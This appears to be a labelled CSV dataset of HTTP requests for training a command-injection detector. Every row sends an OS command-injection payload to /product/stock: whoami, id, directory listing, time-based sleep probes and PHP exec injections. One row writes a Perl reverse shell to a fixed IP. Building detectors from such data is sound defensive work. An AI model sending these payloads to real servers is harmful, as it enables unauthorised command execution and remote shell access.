method,path,body,dashes,andsign,dolar,orsign,lessthan,greaterthan,exclamation,badwords,class
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo TNNFNL)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",0,0,3,1,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""
echo$IFSSGWCNL$((73+94))$(echo$IFSSGWCNL)SGWCNL'",0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSSDEPLL$((89+42))$(echo$IFSSDEPLL)SDEPLL'",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &echo UDYYJG$((66+1))$(echo UDYYJG)UDYYJG',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo JQNEXE)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo HATTRN$((28+69))$(echo HATTRN)HATTRN&,0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo EDEEZB$((20+80))$(echo EDEEZB)EDEEZB""",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 2 -ne $(echo QPTCDE | tr -d '\n' | wc -c) ] || sleep 1 %27,0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""echo EPDILQ$((5+61))$(echo EPDILQ)EPDILQ//",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo VKPFAP$((92+94))$(echo VKPFAP)VKPFAP""",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 3 -ne $(echo XOCDUH | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo KHMFRS$((69+67))$(echo KHMFRS)KHMFRS',0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 |echo DWSCBS$((75+48))$(echo DWSCBS)DWSCBS""",0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 4 -ne $(echo XWWMIW | tr -d '\n' | wc -c) ] || sleep 1 #",0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 print(`echo WQMIIN`.`echo $((36+90))`.`echo WQMIIN`.`echo WQMIIN`);.""WQMIIN",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo NBAQGO); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi |",0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 &echo BVRSLI$((35+17))$(echo BVRSLI)BVRSLI&,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSKQEDXL$((91+84))$(echo$IFSKQEDXL)KQEDXL\,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo MCEEEZ$((59+2))$(echo MCEEEZ)MCEEEZ\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 exec('whoami');,0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 2 -ne $(echo TPTKGE | tr -d '\n' | wc -c) ] || sleep 1 &",0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
echo$IFSDWMULK$((25+34))$(echo$IFSDWMULK)DWMULK",0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
id",0,0,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSXMLIVZ$((57+49))$(echo$IFSXMLIVZ)XMLIVZ//,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo OBGZFK$((77+1))$(echo OBGZFK)OBGZFK,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '; str=$(echo RCYHEM); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo SETBTR$((9+96))$(echo SETBTR)SETBTR',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo DPKVKY$((97+15))$(echo DPKVKY)DPKVKY\,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 echo$IFSGEYHDT$((98+13))$(echo$IFSGEYHDT)GEYHDT//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1  echo BRUWPJ$((24+60))$(echo BRUWPJ)BRUWPJ""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo GZRNZB)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %27",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '||echo YEMQVY$((61+88))$(echo YEMQVY)YEMQVY\,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '||echo SPFQXR$((54+70))$(echo SPFQXR)SPFQXR|,0,0,2,3,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSRWDBVK$((60+13))$(echo$IFSRWDBVK)RWDBVK',0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | ls -laR /var/www,0,0,0,1,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 &&,0,1,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&echo PLTXSN$((86+55))$(echo PLTXSN)PLTXSN&,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ';echo RWVNGG$((78+53))$(echo RWVNGG)RWVNGG//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "";echo$IFSHBDBVM$((41+30))$(echo$IFSHBDBVM)HBDBVM\",0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo FXCZOR)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %26",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ;phpinfo(),0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo NFZBSQ$((53+70))$(echo NFZBSQ)NFZBSQ\",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ';echo$IFSJNEQYI$((45+53))$(echo$IFSJNEQYI)JNEQYI,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo LZYGCY$((26+70))$(echo LZYGCY)LZYGCY//,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 echo SLHLJI$((31+31))$(echo SLHLJI)SLHLJI',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "");}print(`echo MPXDZZ
echo $((78+91))
echo MPXDZZ
echo MPXDZZ`);.%2522MPXDZZ",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 '&&echo$IFSOSNMTB$((17+53))$(echo$IFSOSNMTB)OSNMTB|,0,1,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo ZGYOBQ); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 &&echo MNUDNV$((12+9))$(echo MNUDNV)MNUDNV',0,1,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "");}print(`echo GHISCR\necho $((96+53))\necho GHISCR\necho GHISCR`);.%252522GHISCR",0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 ||echo FCIAEL$((12+72))$(echo FCIAEL)FCIAEL',0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo WYYYZM)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %22",0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo$IFSKHRFCH$((77+13))$(echo$IFSKHRFCH)KHRFCH""",0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo YXUPUJ) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 %5C%5C,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 );}print(`echo KDYDKK\necho $((47+87))\necho KDYDKK\necho KDYDKK`);//KDYDKK,0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 && sleep 1,0,1,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '| [ 8 -ne $(echo YGAAWQ | tr -d '\n' | wc -c) ] || sleep 1 """,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo JCHUJJ$((46+0))$(echo JCHUJJ)JCHUJJ&,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 exec('sleep 5');,0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ${exec(print(`echo UZNHTA
echo $((79+41))
echo UZNHTA
echo UZNHTA`);%2523UZNHTA",0,0,2,0,0,0,0,6,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 |echo$IFSCYXIRA$((56+74))$(echo$IFSCYXIRA)CYXIRA""",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSANVKGR$((37+60))$(echo$IFSANVKGR)ANVKGR',0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '.print(`echo VWGDMS`.`echo $((77+11))`.`echo VWGDMS`.`echo VWGDMS`);#VWGDMS,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 &echo OSJJGL$((20+68))$(echo OSJJGL)OSJJGL|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 & perl -e 'print ""X""x2048'",0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 echo$IFSUBGQBR$((73+83))$(echo$IFSUBGQBR)UBGQBR//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ${shell_exec(print(`echo CKFBET`.`echo $((33+76))`.`echo CKFBET`.`echo CKFBET`);.'CKFBET,0,0,2,0,0,0,0,6,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1  echo NKOHBN$((96+64))$(echo NKOHBN)NKOHBN""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | [ 7 -ne $(echo WIGALP | tr -d '\n' | wc -c) ] || sleep 1 %22,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo ATDESO) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '&&echo LPSXXC$((9+32))$(echo LPSXXC)LPSXXC,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | netstat -an,0,0,0,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "" echo KCONLL$((35+55))$(echo KCONLL)KCONLL|",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo IHGKBJ)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %5C%5C",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo YCSCIW)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi //",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ${proc_open(print(`echo CPKMZS`.`echo $((71+91))`.`echo CPKMZS`.`echo CPKMZS`);.'CPKMZS,0,0,2,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo HFODHQ)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi #",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo EHNNQT) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo EDOOGB$((28+29))$(echo EDOOGB)EDOOGB//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo GHEHAJ); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSPTCLJM$((60+39))$(echo$IFSPTCLJM)PTCLJM&,0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "";echo$IFSLKBKVH$((78+91))$(echo$IFSLKBKVH)LKBKVH""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "";echo$IFSPOSWYF$((84+58))$(echo$IFSPOSWYF)POSWYF",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '| [ 7 -ne $(echo PSPAPE | tr -d '\n' | wc -c) ] || sleep 1 &,0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo GZKCJA)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %5C%5C",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ' echo PQOBOJ$((4+75))$(echo PQOBOJ)PQOBOJ&,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo GKEMGA$((51+90))$(echo GKEMGA)GKEMGA|,0,1,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 #,0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 '||echo DNOHYC$((47+59))$(echo DNOHYC)DNOHYC""",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ;echo SKJOIJ$((68+83))$(echo SKJOIJ)SKJOIJ,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '| [ 4 -ne $(echo YGAAWQ | tr -d '\n' | wc -c) ] || sleep 1 """,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 print(`echo NSKJQW;echo $((41+11));echo NSKJQW;echo NSKJQW`);.%22NSKJQW,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSNIHTHK$((9+70))$(echo$IFSNIHTHK)NIHTHK|,0,0,4,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 & echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",0,0,4,0,0,4,0,4,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo ZSSQMT); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&echo$IFSSGWYGH$((17+18))$(echo$IFSSGWYGH)SGWYGH//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 'print(`echo GSORDT;echo $((68+29));echo GSORDT;echo GSORDT`);%23GSORDT,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 ; systeminfo,0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo JTHMZI)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi #",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;id;,0,0,0,0,0,0,0,0,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo AITHIZ$((84+6))$(echo AITHIZ)AITHIZ\\",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo KNBVGS$((2+62))$(echo KNBVGS)KNBVGS',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '.print(`echo NXDUHQ
echo $((28+78))
echo NXDUHQ
echo NXDUHQ`);NXDUHQ",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSHUIGCW$((90+23))$(echo$IFSHUIGCW)HUIGCW//,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '||echo$IFSTQUEWX$((62+61))$(echo$IFSTQUEWX)TQUEWX,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ')print(`echo BONGAS;echo $((69+7));echo BONGAS;echo BONGAS`);%5C%5CBONGAS,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ';echo$IFSKTDMLA$((82+25))$(echo$IFSKTDMLA)KTDMLA//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo WBDHXY); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi #",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo$IFSZMOHUU$((94+69))$(echo$IFSZMOHUU)ZMOHUU""",0,0,4,2,0,0,0,2,bad
